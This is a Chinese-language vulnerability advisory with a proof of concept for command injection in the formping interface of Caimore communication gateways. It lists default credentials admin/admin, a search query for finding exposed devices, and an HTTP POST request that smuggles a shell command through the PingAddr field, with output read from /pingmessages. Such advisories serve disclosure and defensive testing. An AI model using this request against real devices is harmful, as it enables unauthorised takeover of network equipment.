# 才茂通信 网关  formping 远程命令执行漏洞

## 漏洞描述

才茂通信网关  formping 接口存在远程命令执行漏洞，攻击者通过默认口令 admin/admin 登陆系统后通过命令可以获取服务器权限

## 漏洞影响

<a-checkbox checked>才茂通信 网关 </a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="CAIMORE-Gateway"</a-checkbox></br>

## 漏洞复现

登陆页面，默认口令 admin/admin

![img](../../../.vuepress/public/img/1681381379945-dee7d6a4-f5ab-477b-988f-73c5b0d53986.png)

验证POC

```plain
POST /goform/formping
Authorization: Basic YWRtaW46YWRtaW4=

PingAddr=www.baidu.com%7Cls&PingPackNumb=1&PingMsg=
```

![img](../../../.vuepress/public/img/1681386245774-e2311065-b689-435f-b070-7361306ae064.png)



```plain
/pingmessages
```

![img](../../../.vuepress/public/img/1681386230461-7f63b5d4-1994-4408-b30a-adbd73cc33a4.png)